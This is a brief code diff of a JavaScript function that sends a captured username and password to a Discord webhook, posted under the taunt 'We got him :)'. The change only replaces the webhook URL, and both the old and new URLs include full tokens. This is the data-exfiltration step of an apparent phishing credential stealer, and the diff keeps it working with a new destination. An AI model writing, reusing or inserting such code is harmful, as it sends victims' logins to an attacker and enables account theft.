@@ -1,6 +1,6 @@
 
 function sendData(User, Pass) {
-    $.post('https://discord.com/api/webhooks/1048994205323763752/hYfgp4XmfG4PJhUKxlrYtevnB0xvRuuwHhD5MM-F5kK1kjiQBBDAncUjXozvGr5nUGiP',
+    $.post('https://discord.com/api/webhooks/1049386385670418483/2ldO8XQev3xqHJt2j-hl2RhsNkpGXGsz90guX1_3fEDUhSc4Jin4E9MLz7vaweLsy4_5',
     {
         'username': 'We got him :)',
         'content': 'Username:\n\t' + User + '\nPassword:\n\t' + Pass,
